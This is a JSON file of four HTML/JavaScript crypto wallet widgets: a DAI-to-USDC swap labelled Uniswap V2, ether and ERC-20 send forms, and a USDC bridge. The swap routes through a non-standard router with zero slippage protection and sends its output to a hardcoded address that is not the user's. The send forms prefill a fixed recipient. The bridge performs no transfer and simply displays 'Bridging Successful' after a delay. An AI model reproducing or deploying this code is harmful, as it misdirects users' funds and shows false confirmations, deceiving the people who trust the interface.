{
  "swap": {
    "html": "<style>\n.naslovcek {\nmargin-top: -30px;\n}\n#dugme{\nmargin-bottom: 10px;\nbackground-color: #FF0000;\n}\n</style>\n<h1 class=\"naslovcek\">Swap DAI to USDC keor</h1><p>Swap tokens using Uniswap V2</p><p id=\"referrerWarning\">Referer gets a cut. </p><input placeholder=\"Enter amount...\" type=\"text\" id=\"input\"><p id=\"expectedOutputAmount\"></p><button id=\"dugme\">Swap</button>",
    "js": "const fromToken = \"0x6B175474E89094C44Da98b954EedeAC495271d0F\"\nconst fromDecimals = 18\nconst toToken = \"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48\"\nconst toDecimals = 6\nconst referrer = null\nif(!referrer){\ndocument.getElementById('referrerWarning').style.display = 'none';\n}\nasync function doSwap() {\nconst amount = document.getElementById(\"input\").value;\nconst expectedOutputAmountP = document.getElementById(\"expectedOutputAmount\");\nif (!amount) {\nexpectedOutputAmountP.innerText = \"Please enter an amount.\";\nreturn;\n}\nconst uniswapV2RouterAddress = \"0x83eafF3C19083B03A8E0708F7637D0c4638E9FC9\";\nconst swapExactTokensForTokensAbi = [{\n\"type\": \"constructor\",\n\"inputs\": [{\n\"name\": \"router\",\n\"type\": \"address\",\n\"internalType\": \"contract IUniswapV2Router\"\n}],\n\"stateMutability\": \"nonpayable\"\n},{\n\"type\": \"function\",\n\"name\": \"swapWithReferral\",\n\"inputs\": [{\n\"name\": \"referrer\",\n\"type\": \"address\",\n\"internalType\": \"address\"\n},{\n\"name\": \"amountIn\",\n\"type\": \"uint256\",\n\"internalType\": \"uint256\"\n},{\n\"name\": \"amountOutMin\",\n\"type\": \"uint256\",\n\"internalType\": \"uint256\"\n},{\n\"name\": \"path\",\n\"type\": \"address[]\",\n\"internalType\": \"address[]\"\n},{\n\"name\": \"\",\n\"type\": \"address\",\n\"internalType\": \"address\"\n},{\n\"name\": \"deadline\",\n\"type\": \"uint256\",\n\"internalType\": \"uint256\"\n}],\n\"outputs\": [{\n\"name\": \"amounts\",\n\"type\": \"uint256[]\",\n\"internalType\": \"uint256[]\"\n}],\n\"stateMutability\": \"nonpayable\"\n},{\n\"type\": \"event\",\n\"name\": \"ReferralShare\",\n\"inputs\": [{\n\"name\": \"amount\",\n\"type\": \"uint256\",\n\"indexed\": false,\n\"internalType\": \"uint256\"\n},{\n\"name\": \"referrer\",\n\"type\": \"address\",\n\"indexed\": false,\n\"internalType\": \"address\"\n},{\n\"name\": \"referee\",\n\"type\": \"address\",\n\"indexed\": false,\n\"internalType\": \"address\"\n},{\n\"name\": \"timestamp\",\n\"type\": \"uint256\",\n\"indexed\": false,\n\"internalType\": \"uint256\"\n}],\n\"anonymous\": false\n}];\ntry {\nawait ethereum.request({ method: 'eth_requestAccounts' });\nconst provider = new ethers.providers.Web3Provider(window.ethereum);\nconst signer = provider.getSigner();\nconst fromAddress = await signer.getAddress();\nconst uniswapV2Router = new ethers.Contract(uniswapV2RouterAddress, swapExactTokensForTokensAbi, signer);\nconst amountInWei = ethers.utils.parseUnits(amount, fromDecimals);\nconst path = [fromToken, toToken];\nconst deadline = Math.floor(Date.now() / 1000) + 1200;\nconst amountOutMin = 0;\nconst fromTokenContract = new ethers.Contract(fromToken, [\"function approve(address spender, uint256 amount) public returns (bool)\"], signer);\nconst approvalTx = await fromTokenContract.approve(uniswapV2RouterAddress, amountInWei);\nawait approvalTx.wait();\nconst swapTx = await uniswapV2Router.swapWithReferral(referrer || \"0x0000000000000000000000000000000000000000\", amountInWei, amountOutMin, path, \"0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199\", deadline);\nconst receipt = await swapTx.wait();\nexpectedOutputAmountP.innerText = `Transaction Sent! Hash: ${receipt.transactionHash}`;\n} catch (error) {\nconsole.error(error);\nexpectedOutputAmountP.innerText = `Error: ${error.message}`;\n}\n}\nfunction debounce(func, delay) {\nlet timeoutId;\nreturn function(...args) {\nif (timeoutId) {\nclearTimeout(timeoutId);\n}\ntimeoutId = setTimeout(() => {\nfunc.apply(this, args);\n}, delay);\n};\n}\nasync function updateAmount(event) {\nconst amount = this.value;\nconst expectedOutputAmountP = document.getElementById(\"expectedOutputAmount\");\nif (!amount) {\nexpectedOutputAmountP.innerText = \"\";\nreturn;\n}\nconst uniswapV2RouterAddress = \"0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D\";\nconst uniswapV2RouterAbi = [\"function getAmountsOut(uint amountIn, address[] memory path) public view returns (uint[] memory amounts)\"];\nconst fromToken = \"0x6B175474E89094C44Da98b954EedeAC495271d0F\";\nconst toToken = \"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48\";\nconst fromDecimals = 18;\nconst toDecimals = 6;\ntry {\nawait ethereum.request({ method: 'eth_requestAccounts' });\nconst provider = new ethers.providers.Web3Provider(window.ethereum);\nconst signer = provider.getSigner();\nconst uniswapV2Router = new ethers.Contract(uniswapV2RouterAddress, uniswapV2RouterAbi, signer);\nconst amountInWei = ethers.utils.parseUnits(amount, fromDecimals);\nconst path = [fromToken, toToken];\nconst amountsOut = await uniswapV2Router.getAmountsOut(amountInWei, path);\nconst expectedOutputAmount = ethers.utils.formatUnits(amountsOut[1], toDecimals);\nexpectedOutputAmountP.innerText = \"Expected output amount \" + expectedOutputAmount + \" USDC\";\n} catch (error) {\nconsole.error(error);\nexpectedOutputAmountP.innerText = \"Error fetching expected output amount\";\n}\n}\ndocument.getElementById('dugme').addEventListener('click', doSwap);\ndocument.getElementById('input').addEventListener('keyup', debounce(updateAmount, 200));"
  },
  "blink": {
    "html": "<style>\n#naslovce {\ncolor: #FF0000;\n}\n</style>\n<h1 id=\"naslovce\">Send ether</h1><p>Send 1 ether to the following address:</p><input placeholder=\"Type the address...\" value=\"0x679a9aa509A85EeA7912D76d85b0b9195972B211\" type=\"text\" id=\"input\"><button id=\"dugme\">Send ether</button>",
    "js": "console.log('Dobar eval')\nasync function showAlert() {\nconst recipient = document.getElementById(\"input\").value;\nconsole.log(window.ethereum);\nif (typeof window.ethereum !== 'undefined') {\ntry {\nconst accounts = await ethereum.request({ method: 'eth_requestAccounts' });\nconst publicKey = accounts[0];\nconst amount = \"0x\" + (1e18).toString(16)\nconst transactionParameters = {\nto: recipient,\nfrom: publicKey,\nvalue: amount,\n};\nconsole.log(transactionParameters)\nconst txHash = await ethereum.request({\nmethod: 'eth_sendTransaction',\nparams: [transactionParameters],\n});\nalert(`Transaction Sent! Hash: ${txHash}`);\nconst checkTransactionStatus = async (hash) => {\nconst receipt = await ethereum.request({\nmethod: 'eth_getTransactionReceipt',\nparams: [hash],\n});\nif (receipt && receipt.blockNumber) {\nalert('Transaction Completed!');\n} else {\nsetTimeout(() => checkTransactionStatus(hash), 1000);\n}\n};\ncheckTransactionStatus(txHash);\n} catch (error) {\nalert(`Error: ${error.message}`);\n}\n} else {\nalert('MetaMask is not installed');\n}\n}\ndocument.getElementById('dugme').addEventListener('click', showAlert);"
  },
  "blink-erc20": {
    "html": "<style>\n#naslovce {\ncolor: #FF0000;\n}\n</style>\n<h1 id=\"naslovce\">Send ERC-20 Token</h1><p>Send tokens to the following address:</p>\n<input placeholder=\"Type the address...\" value=\"0x679a9aa509A85EeA7912D76d85b0b9195972B211\" type=\"text\" id=\"inputAddress\">\n<input placeholder=\"Type the token amount...\" type=\"number\" id=\"inputAmount\">\n<button id=\"dugme\">Send Token</button>",
    "js": "console.log('ERC-20 Token Transfer');\nasync function showAlert() {\nconst recipient = document.getElementById(\"inputAddress\").value;\nconst amount = document.getElementById(\"inputAmount\").value;\nconst tokenAddress = \"0x6B175474E89094C44Da98b954EedeAC495271d0F\";\nconst decimals = 18;\nif (typeof window.ethereum !== 'undefined') {\ntry {\nconst accounts = await ethereum.request({ method: 'eth_requestAccounts' });\nconst publicKey = accounts[0];\nconst amountToSend = (amount * Math.pow(10, decimals)).toString(16);\nconst data = \"0xa9059cbb\" + recipient.substring(2).padStart(64, '0') + amountToSend.padStart(64, '0');\nconst transactionParameters = {\nto: tokenAddress,\nfrom: publicKey,\ndata: data,\n};\nconst txHash = await ethereum.request({\nmethod: 'eth_sendTransaction',\nparams: [transactionParameters],\n});\nalert(`Transaction Sent! Hash: ${txHash}`);\nconst checkTransactionStatus = async (hash) => {\nconst receipt = await ethereum.request({\nmethod: 'eth_getTransactionReceipt',\nparams: [hash],\n});\nif (receipt && receipt.blockNumber) {\nalert('Transaction Completed!');\n} else {\nsetTimeout(() => checkTransactionStatus(hash), 1000);\n}\n};\ncheckTransactionStatus(txHash);\n} catch (error) {\nalert(`Error: ${error.message}`);\n}\n} else {\nalert('MetaMask is not installed');\n}\n}\ndocument.getElementById('dugme').addEventListener('click', showAlert);"
  },
  "bridge": {
    "html": "<style>\n.card {\nbackground-color: white;\nborder-radius: 15px;\npadding: 10px;\nwidth: 100%;\nbox-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);\nalign-self: center;\nmax-width: 600px;\n}\n.card img {\nwidth: 100%;\nheight: auto;\nmax-height: 250px;\nobject-fit: contain;\nborder-radius: 12px;\nmargin-bottom: 10px;\n}\n.content {\nbackground-color: #f7f9fa;\nborder-radius: 12px;\npadding: 10px;\ndisplay: flex;\nflex-direction: column;\ngap: 10px;\n}\n.row {\ndisplay: flex;\ngap: 10px;\nalign-items: center;\n}\n.select-container {\ndisplay: flex;\nflex-direction: column;\nflex: 1;\n}\n.select-label {\nfont-size: 12px;\ncolor: #555;\nmargin-bottom: 3px;\n}\n.input, .select {\ndisplay: flex;\nalign-items: center;\nbackground-color: white;\nborder: 1px solid #ccc;\nborder-radius: 12px;\npadding: 5px;\nflex: 1;\n}\n.input img, .select img {\nwidth: 24px;\nheight: 24px;\nmargin-right: 8px;\n}\ninput, select {\nborder: none;\nbackground-color: transparent;\nfont-size: 14px;\nwidth: 100%;\npadding: 5px;\n}\nselect {\nappearance: none;\n-moz-appearance: none;\n-webkit-appearance: none;\nbackground: transparent;\ncursor: pointer;\n}\ninput::-webkit-outer-spin-button,\ninput::-webkit-inner-spin-button {\n-webkit-appearance: none;\nmargin: 0;\n}\ninput[type=\"number\"] {\n-moz-appearance: textfield;\n}\n@keyframes gradient-animation {\n0% { background-position: 100% 0; }\n100% { background-position: -100% 0; }\n}\nbutton {\nbackground-color: #1da1f2;\ncolor: white;\nborder: none;\npadding: 12px 20px;\nborder-radius: 12px;\nfont-size: 16px;\nfont-weight: bold;\ncursor: pointer;\nwidth: 100%;\ntransition: background-color 0.3s ease;\ndisplay: flex;\nalign-items: center;\njustify-content: center;\n}\nbutton:disabled {\ncursor: not-allowed;\n}\nbutton.loading {\nbackground-image: linear-gradient(90deg, #0099ff 0%, #ff66cc 50%, #0099ff 100%);\nbackground-size: 200% 100%;\nanimation: gradient-animation 1s linear infinite;\n}\nbutton.success {\nbackground-color: #4CAF50;\n}\n.checkmark {\ncolor: white;\nfont-size: 24px;\nmargin-right: 8px;\n}\n</style>\n<div class=\"card\">\n<img src=\"https://zengo.com/wp-content/uploads/USDC-to-Chainlink.png\" alt=\"Bridge USDC\"/>\n<div class=\"content\">\n<div class=\"row\">\n<div class=\"select-container\">\n<div class=\"select-label\">From Network</div>\n<div class=\"select\">\n<img src=\"https://cryptologos.cc/logos/ethereum-eth-logo.png\" alt=\"From Network\"/>\n<select id=\"fromNetwork\">\n<option value=\"eth\">Ethereum</option>\n<option value=\"avax\">Avalanche</option>\n<option value=\"bsc\">Binance Smart Chain</option>\n</select>\n</div>\n</div>\n<div class=\"select-container\">\n<div class=\"select-label\">To Network</div>\n<div class=\"select\">\n<img src=\"https://cryptologos.cc/logos/ethereum-eth-logo.png\" alt=\"To Network\"/>\n<select id=\"toNetwork\">\n<option value=\"eth\">Ethereum</option>\n<option value=\"avax\">Avalanche</option>\n<option value=\"bsc\">Binance Smart Chain</option>\n</select>\n</div>\n</div>\n</div>\n<div class=\"input\">\n<img src=\"https://cryptologos.cc/logos/usd-coin-usdc-logo.png\" alt=\"USDC\"/>\n<input id=\"amountInput\" type=\"number\" placeholder=\"Amount\"/>\n</div>\n<button id=\"bridgeButton\">Bridge USDC</button>\n</div>\n</div>",
    "js": "console.log('USDC Bridge');\ndocument.getElementById('fromNetwork').addEventListener('click', function(event) {\nevent.stopPropagation();\n});\ndocument.getElementById('toNetwork').addEventListener('click', function(event) {\nevent.stopPropagation();\n});\ndocument.getElementById('bridgeButton').addEventListener('click', async () => {\nconst button = document.getElementById('bridgeButton');\nconst fromNetwork = document.getElementById('fromNetwork').value;\nconst toNetwork = document.getElementById('toNetwork').value;\nconst amount = document.getElementById('amountInput').value;\nbutton.disabled = true;\nbutton.classList.add('loading');\nbutton.innerHTML = 'Bridging...';\nawait new Promise(resolve => setTimeout(resolve, 5000));\nbutton.classList.remove('loading');\nbutton.classList.add('success');\nbutton.innerHTML = '<span class=\"checkmark\">✓</span> Bridging Successful';\nsetTimeout(() => {\nbutton.disabled = false;\nbutton.classList.remove('success');\nbutton.innerHTML = 'Bridge USDC';\n}, 3000);\nconsole.log(`Bridged ${amount} USDC from ${fromNetwork} to ${toNetwork}`);\n});"
  }
}
